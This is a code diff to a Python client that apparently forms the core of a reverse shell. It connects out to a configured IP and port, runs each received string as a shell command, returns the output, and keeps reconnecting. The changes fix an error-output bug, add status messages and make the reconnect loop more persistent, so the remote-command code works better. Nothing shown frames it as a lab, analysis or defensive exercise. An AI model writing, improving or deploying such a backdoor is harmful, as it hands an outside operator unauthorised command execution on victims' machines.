@@ -29,34 +29,44 @@ def listen(c):
 def cmd(c, data):
     try:
         if data.startswith("cd "):
-            os.chdir(data[3:].strip())
+            try:
+                os.chdir(data[3:].strip())
+                c.send(b"Directory changed successfully\n")
+            except:
+                c.send(b"Failed to change directory\n")
             return
-		
+        
         p = subprocess.Popen(
-			data,
-			shell  = True,
-			stdin  = subprocess.PIPE,
-			stderr = subprocess.PIPE,
-			stdout = subprocess.PIPE
-		)
-		
-        c.send(
-			p.stdout.read() + p.stderror.read() + b"\n"
-		)
+            data,
+            shell=True,
+            stdin=subprocess.PIPE,
+            stderr=subprocess.PIPE,
+            stdout=subprocess.PIPE
+        )
+        
+        output = p.stdout.read() + p.stderr.read()
+        if not output:
+            output = b"Command executed successfully\n"
+            print(output)
+        c.send(output)
+        
     except Exception as e:
-        print('')
-		
+        error_msg = f"Command error: {str(e)}\n".encode()
+        print(error_msg)
 
 if __name__ == '__main__':
+    print(f"Starting client, connecting to {IP}:{PORT}")
     try:
         while True:
             client = connect(IP, PORT)
             if client:
+                print("Connected successfully!")
                 listen(client)
-            else:
-                sleep(.5)
-
+                client.close()
+                print("Connection closed, retrying...")
+            sleep(2)
+            
     except KeyboardInterrupt:
-        print("Program interrupted by user")
+        print("\nProgram interrupted by user")
     except Exception as e:
         print(f"Main connection error: {e}")
